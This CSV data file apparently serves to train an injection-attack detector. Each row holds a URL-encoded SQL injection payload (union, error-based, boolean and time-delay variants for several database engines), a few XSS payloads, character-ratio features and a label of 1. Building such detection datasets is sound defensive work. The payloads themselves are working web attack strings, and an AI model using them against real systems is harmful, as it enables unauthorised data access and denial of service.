payload,payload_len,alpha,non_alpha,attack_feature,label
1%29%29%20as%20faxr%20where%207972%3D7972%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,125,84.0,16.0,90000.0,1
-4960%27%29%20union%20all%20select%205300--,31,83.87096774193549,16.129032258064516,60000.0,1
1%27%7C%7C%28select%20%27yaii%27%20from%20dual%20where%207317%3D7317%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,107,85.04672897196261,14.953271028037381,120000.0,1
1%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sddo%29%23,45,75.55555555555556,24.444444444444443,60000.0,1
1%25%27%29%29%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%28%28%27%25%27%3D%27,200,71.0,28.999999999999996,60000.0,1
1%27%20rlike%20%28select%20%28case%20when%20%287689%3D7689%29%20then%201%20else%200x28%20end%29%29,62,88.70967741935483,11.290322580645167,12.727272727272734,1
1%25%27%29%29%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29%20and%20%28%28%27%25%27%3D%27,108,74.07407407407408,25.925925925925924,60000.0,1
1%27%7C%7C%28select%20%27mdqc%27%20where%204533%3D4533%20and%208189%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29--,137,85.40145985401459,14.5985401459854,90000.0,1
1%20where%207072%3D7072%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29--,220,85.0,15.0,270000.0,1
-5360%27%20where%208178%3D8178%20union%20all%20select%208178%2C8178%2C8178--,56,87.5,12.5,90000.0,1
1%27%2B%28select%20%27upmd%27%20where%203438%3D3438%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,65,78.46153846153847,21.53846153846154,30000.0,1
1%27%29%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%27thce%27%3D%27thce,123,77.23577235772358,21.951219512195124,90000.0,1
1%22%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29,63,77.77777777777779,22.22222222222222,39000.0,1
1%27%20and%203824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29,46,84.78260869565217,15.217391304347828,30000.0,1
1%22%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29,61,77.04918032786885,22.950819672131146,9000.0,1
1%27%7C%7C%28select%20%27vxfx%27%20where%207038%3D7038%20and%209306%3D4187%29%7C%7C%27,52,76.92307692307693,23.076923076923077,60000.0,1
1%3Bselect%20%28case%20when%20%284624%3D4844%29%20then%204624%20else%201/%28select%200%29%20end%29--,66,89.39393939393939,10.606060606060609,11.86440677966102,1
1%29%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual,84,73.80952380952381,26.190476190476193,30000.0,1
1%22%29%29%29%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%28%28%22oohx%22%20like%20%22oohx,91,74.72527472527473,25.274725274725274,99000.0,1
%22data%3Atext/html%3Bbase64%2Cphnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4%3D%22%3E,69,92.7536231884058,7.246376811594203,7.8125,1
1%27%7C%7C%28select%20%27brde%27%20where%207390%3D7390%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%7C%7C%27,237,72.57383966244726,27.42616033755274,90000.0,1
-6294%22%20union%20all%20select%209921%2C9921%2C9921%2C9921%2C9921%2C9921--,55,83.63636363636363,16.363636363636363,60000.0,1
1%27%29%28select%20%28case%20when%20%284587%3D4587%29%20then%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%2876%29%7C%7Cchar%2865%29%7C%7Cchar%28102%29%7C%7Cchar%2872%29%20end%29%20from%20%28values%280%29%29%29%20and%20%28%27ylit%27%20like%20%27ylit,223,75.33632286995515,24.663677130044842,90000.0,1
-1630%27%20union%20all%20select%201971%2C1971--,35,85.71428571428571,14.285714285714285,60000.0,1
1%29%20or%204915%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,97,85.56701030927834,14.432989690721648,60000.0,1
1%27%20%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29%20and%20%27hqqj%27%3D%27hqqj,206,80.09708737864078,19.902912621359224,60000.0,1
-9072%29%20as%20saot%20where%202278%3D2278%20order%20by%201%23,42,90.47619047619048,9.523809523809524,60000.0,1
-3699%25%27%29%29%29%20union%20all%20select%208241%2C8241%2C8241%2C8241%2C8241%2C8241%2C8241%2C8241%2C8241%23,73,79.45205479452055,20.54794520547945,60000.0,1
1%27%29%29%29%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%28%28%28%27sbey%27%3D%27sbey,221,70.13574660633483,29.86425339366516,90000.0,1
1%27%29%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27--,29,62.06896551724138,37.93103448275862,30000.0,1
1%27%20where%202162%3D2162%20procedure%20analyse%28extractvalue%289627%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x4b774c75%29%29%29%29%29%2C1%29%23,109,82.56880733944955,17.431192660550458,30000.0,1
1%27%2B%28select%20wpbj%20where%201849%3D1849%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,125,86.4,13.600000000000001,60000.0,1
1%27%29%20and%20elt%281210%3D1210%2Csleep%285%29%29%20and%20%28%27gtov%27%20like%20%27gtov,54,77.77777777777779,22.22222222222222,90000.0,1
-1808%25%22%29%29%20or%204595%3D3545%20and%20%28%28%22%25%22%3D%22,34,61.76470588235294,38.23529411764706,60000.0,1
1%22%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,72,81.94444444444444,18.055555555555554,60000.0,1
1%27%29%29%20as%20pdrg%20where%205960%3D5960%20and%209198%3D9198--,44,84.0909090909091,15.909090909090908,60000.0,1
1%22%29%29%20and%205556%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%28%28%22kpwc%22%20like%20%22kpwc,125,81.6,18.4,120000.0,1
-6407%27%29%20or%20elt%281631%3D4946%2C4946%29%20and%20%28%27jpnz%27%3D%27jpnz,48,75.0,25.0,60000.0,1
-9297%29%20union%20all%20select%206841%2C6841%2C6841%2C6841%2C6841--,50,84.0,16.0,60000.0,1
1%22%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%22zwov%22%3D%22zwov,78,80.76923076923077,19.230769230769234,90000.0,1
1%22%20where%208635%3D8635%20and%204595%3D4595%23,33,87.87878787878788,12.121212121212121,60000.0,1
1%27%29%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29%20and%20%28%27lkun%27%20like%20%27lkun,156,84.61538461538461,15.384615384615385,60000.0,1
-8824%25%27%29%29%20or%20make_set%289354%3D9354%2C7185%29%20and%20%28%28%27%25%27%3D%27,49,65.3061224489796,34.69387755102041,60000.0,1
-4803%25%27%29%29%20or%208571%3D8571--,24,66.66666666666666,33.33333333333333,30000.0,1
1%27%2B%28select%20mkbv%20where%201648%3D1648%20and%209254%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,139,86.33093525179856,13.66906474820144,90000.0,1
1%25%22%29%29%29%20or%202633%3Ddbms_pipe.receive_message%28chr%28112%29%7C%7Cchr%2865%29%7C%7Cchr%2865%29%7C%7Cchr%28103%29%2C5%29%20and%20%28%28%28%22%25%22%3D%22,93,63.44086021505376,36.55913978494624,60000.0,1
1%25%22%29%29%29%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3--,98,83.6734693877551,16.3265306122449,30000.0,1
1%27%29%29%29%20and%202006%3D2006,19,73.68421052631578,26.31578947368421,30000.0,1
1%22%29%20where%202657%3D2657%20and%205309%3D7592--,35,82.85714285714286,17.142857142857142,60000.0,1
1%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%23,40,87.5,12.5,60000.0,1
1%22%29%20where%206138%3D6138%20and%208594%3D%28select%208594%20from%20pg_sleep%285%29%29--,61,81.9672131147541,18.0327868852459,90000.0,1
1%22%29%20as%20esks%20where%201138%3D1138%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,144,84.72222222222221,15.277777777777779,90000.0,1
1%22%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%22fkdx%22%20like%20%22fkdx,119,87.39495798319328,12.605042016806722,90000.0,1
-1621%27%20in%20boolean%20mode%29%20order%20by%201--,36,86.11111111111111,13.88888888888889,30000.0,1
1%27%29%29%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%28%28%27miba%27%3D%27miba,117,82.90598290598291,17.094017094017094,90000.0,1
1%29%29%20as%20avdz%20where%201881%3D1881%20and%206510%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,180,90.55555555555556,9.444444444444445,90000.0,1
1%27%2B%28select%20%27feof%27%20where%201966%3D1966%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29%29%2B%27,151,82.78145695364239,17.218543046357617,90000.0,1
1%29%29%20as%20myxo%20where%201759%3D1759%20union%20all%20select%20null%23,50,92.0,8.0,90000.0,1
1%29%20where%201185%3D1185%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29--,122,79.50819672131148,19.672131147540984,90000.0,1
1%20where%201636%3D1636%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29--,113,84.95575221238938,15.04424778761062,90000.0,1
1%27%29%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29,103,87.37864077669903,12.62135922330097,60000.0,1
1%25%27%29%29%20and%20char%28107%29%7C%7Cchar%28121%29%7C%7Cchar%2897%29%7C%7Cchar%2880%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,146,69.17808219178082,30.82191780821918,30000.0,1
-6095%22%29%20as%20hygc%20where%208142%3D8142%20or%202724%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%282724%3D2724%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2,213,60.093896713615024,15.492957746478872,60000.0,1
1%27%29%20or%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%286270%3D6270%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%27nopu%27%3D%27nopu,123,77.23577235772358,21.951219512195124,90000.0,1
1%25%27%20order%20by%201--,16,75.0,25.0,30000.0,1
1%27%29%29%29%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20and%20%28%28%28%27nfix%27%3D%27nfix,224,70.98214285714286,29.017857142857146,90000.0,1
1%27%20or%20char%28119%29%7C%7Cchar%28100%29%7C%7Cchar%2899%29%7C%7Cchar%28121%29%3Dregexp_substring%28repeat%28right%28char%281441%29%2C0%29%2C5000000000%29%2Cnull%29--,111,72.97297297297297,27.027027027027028,30000.0,1
1%25%27%29%3Bselect%20sleep%285%29%23,21,66.66666666666666,33.33333333333334,50.00000000000002,1
1%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,66,83.33333333333334,16.666666666666664,60000.0,1
1%27%29%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%27qfwc%27%3D%27qfwc,80,78.75,21.25,90000.0,1
1%25%27%29%3Bselect%20%28case%20when%20%286276%3D6276%29%20then%206276%20else%206276%2A%28select%206276%20from%20information_schema.character_sets%29%20end%29%23,113,85.84070796460178,14.15929203539823,30000.0,1
1%25%22%29%29%29%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%28%28%22%25%22%3D%22,108,73.14814814814815,26.851851851851855,60000.0,1
1%27%20or%20sleep%285%29%20and%20%27rpqn%27%20like%20%27rpqn,36,83.33333333333334,16.666666666666664,90000.0,1
1%25%22%20or%205356%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,155,89.6774193548387,10.32258064516129,60000.0,1
1%29%29%20and%20elt%281210%3D1210%2Csleep%285%29%29%20and%20%28%285874%3D5874,47,76.59574468085107,23.404255319148938,60000.0,1
1%27%29%29%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%28%27agsi%27%3D%27agsi,123,83.73983739837398,16.260162601626014,90000.0,1
1%22%29%29%20as%20ktue%20where%206392%3D6392%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,124,86.29032258064517,13.709677419354838,90000.0,1
1%27%29%29%20as%20owcw%20where%201107%3D1107%20and%208312%3Ddbms_pipe.receive_message%28chr%2869%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%7C%7Cchr%2868%29%2C5%29--,104,74.03846153846155,25.961538461538463,60000.0,1
1%27%29%29%29%3Bcall%20regexp_substring%28repeat%28right%28char%282385%29%2C0%29%2C500000000%29%2Cnull%29--,73,82.1917808219178,17.808219178082197,21.666666666666675,1
1%20where%206119%3D6119%20or%202367%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,124,87.09677419354838,12.903225806451612,90000.0,1
-3096%27%20or%203821%3D5539%20and%20%27zrth%27%3D%27zrth,36,80.55555555555556,19.444444444444446,60000.0,1
1%29%20where%202020%3D2020%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,63,85.71428571428571,14.285714285714285,60000.0,1
-8725%22%29%29%29%20or%20%288459%3D8459%29%2A4906%20and%20%28%28%28%22vblw%22%20like%20%22vblw,54,72.22222222222221,27.77777777777778,90000.0,1
1%22%29%20as%20jiyl%20where%204893%3D4893%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,70,88.57142857142857,11.428571428571429,90000.0,1
1%27%2Cexp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%287759%3D7759%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29,101,77.22772277227723,21.782178217821784,30000.0,1
1%29%20as%20afmb%20where%208665%3D8665%20order%20by%201%23,38,92.10526315789474,7.894736842105263,60000.0,1
-5691%27%20union%20all%20select%206610%2C6610%23,34,88.23529411764706,11.76470588235294,60000.0,1
1%29%20where%205234%3D5234%20or%208514%3Dbenchmark%285000000%2Cmd5%280x544d5a4c%29%29%23,62,85.48387096774194,14.516129032258066,60000.0,1
-3361%29%29%20union%20all%20select%202827%2C2827%2C2827%2C2827%23,45,84.44444444444444,15.555555555555555,60000.0,1
1%27%7C%7C%28select%20%27vwls%27%20where%205252%3D5252%20rlike%20sleep%285%29%23,50,80.0,20.0,30000.0,1
1%27%29%29%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%20and%20%28%28%27foop%27%20like%20%27foop,227,72.68722466960352,27.312775330396477,120000.0,1
1%22%29%29%29%20or%20char%2875%29%7C%7Cchar%2870%29%7C%7Cchar%2899%29%7C%7Cchar%2883%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,143,68.53146853146853,31.46853146853147,30000.0,1
1%27%7C%7C%28select%20%27dezl%27%20where%208661%3D8661%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%7C%7C%27,133,83.45864661654136,16.541353383458645,60000.0,1
1%27%29%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%28%27xikz%27%20like%20%27xikz,87,78.16091954022988,21.839080459770116,99000.0,1
1%22%20where%204597%3D4597%20rlike%20sleep%285%29--,35,82.85714285714286,17.142857142857142,30000.0,1
1%27%29%29%20as%20cyom%20where%202318%3D2318%20and%207533%3D7533--,44,84.0909090909091,15.909090909090908,60000.0,1
-5580%20or%204829%3D1968,18,88.88888888888889,11.11111111111111,30000.0,1
-3703%22%29%29%29%20union%20all%20select%203293%2C3293%2C3293%2C3293%2C3293%2C3293%2C3293%2C3293%2C3293%2C3293%23,77,80.51948051948052,19.480519480519483,60000.0,1
1%22%29%29%29%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,103,79.6116504854369,20.388349514563107,60000.0,1
1%27%29%29%29%3Bselect%20%28case%20when%20%286969%3D5797%29%20then%206969%20else%206969%2A%28select%206969%20from%20information_schema.character_sets%29%20end%29%23,114,85.08771929824562,14.912280701754385,30000.0,1
1%22%29%20as%20vqkz%20where%208536%3D8536%3Bbegin%20user_lock.sleep%285%29%3B%20end--,59,81.35593220338984,18.64406779661017,30000.0,1
1%25%22%29%29%29%20and%203715%20in%20%28%28char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%283715%3D3715%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29%20and%20%28%28%28%22%25%22%3D%22,200,71.0,28.999999999999996,60000.0,1
1%27%20in%20boolean%20mode%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull--,58,87.93103448275862,12.068965517241379,60000.0,1
-1192%20order%20by%201%23,17,88.23529411764706,11.76470588235294,30000.0,1
-8945%29%29%20as%20fszo%20where%202320%3D2320%20union%20all%20select%202320--,55,89.0909090909091,10.909090909090908,90000.0,1
1%25%27%29%20and%206055%3Dctxsys.drithsx.sn%286055%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%286055%3D6055%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29%29%20and%20%28%27%25%27%3D%27,211,69.66824644549763,30.33175355450237,90000.0,1
-7485%25%27%29%29%29%20union%20all%20select%201303%2C1303%2C1303%2C1303%2C1303%2C1303%2C1303%2C1303%2C1303--,74,78.37837837837837,21.62162162162162,60000.0,1
1%25%27%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%27%25%27%3D%27,118,83.05084745762711,16.94915254237288,90000.0,1
prompt%281%29%3B%3E,11,63.63636363636363,36.36363636363637,57.14285714285715,1
1%25%27%29%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%20and%20%28%27%25%27%3D%27,115,82.6086956521739,17.391304347826086,90000.0,1
-1302%22%29%29%20as%20rshr%20where%202800%3D2800%20or%204747%3Ddbms_utility.sqlid_to_sqlhash%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284747%3D4747%29%20then%201%20else%20,236,54.23728813559322,15.677966101694915,60000.0,1
1%27%20or%208384%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%27aytf%27%20like%20%27aytf,84,79.76190476190477,20.238095238095237,99000.0,1
1%25%27%29%3Bbegin%20user_lock.sleep%285%29%3B%20end%20and%20%28%27%25%27%3D%27,45,66.66666666666666,33.33333333333333,30000.0,1
1%27%20where%204272%3D4272%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%23,56,89.28571428571429,10.714285714285714,90000.0,1
-6854%22%20where%207794%3D7794%20union%20all%20select%207794%2C7794--,51,88.23529411764706,11.76470588235294,90000.0,1
1%25%22%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%23,46,84.78260869565217,15.217391304347828,60000.0,1
1%27%2B%28select%20bfeq%20where%203445%3D3445%20and%209198%3D9198--,47,85.1063829787234,14.893617021276595,60000.0,1
1%27%29%29%20or%208156%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,64,76.5625,23.4375,60000.0,1
1%22%20where%201920%3D1920%20and%208635%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,79,82.27848101265823,17.72151898734177,90000.0,1
1%27%20and%20elt%283247%3D3969%2C3969%29%20and%20%27xcbm%27%20like%20%27xcbm,48,83.33333333333334,16.666666666666664,90000.0,1
1%25%27%29%20and%20char%28107%29%7C%7Cchar%28121%29%7C%7Cchar%2897%29%7C%7Cchar%2880%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,145,69.6551724137931,30.344827586206897,30000.0,1
1%27%29%29%29%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,99,82.82828282828282,17.17171717171717,30000.0,1
1%25%27%29%29%29%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%28%28%27%25%27%3D%27,78,70.51282051282051,29.48717948717949,90000.0,1
%28select%20%28case%20when%20%289263%3D9263%29%20then%201%20else%209263%2A%28select%209263%20from%20mysql.db%29%20end%29%29,81,86.41975308641975,13.580246913580247,30000.0,1
1%22%29%20where%202367%3D2367%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,113,85.84070796460178,14.15929203539823,60000.0,1
-9015%25%22%29%20union%20all%20select%206948%2C6948--,37,81.08108108108108,18.91891891891892,60000.0,1
1%27%2B%28select%20sshu%20where%203442%3D3442%20and%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%283484%3D3484%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%29%2B%27,190,82.10526315789474,17.894736842105264,90000.0,1
1%27%29%20and%20updatexml%283393%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%283393%3D3393%2C1%29%29%29%2C0x717a767a71%29%2C1161%29%20and%20%28%27ngxz%27%3D%27ngxz,113,78.76106194690266,21.238938053097346,60000.0,1
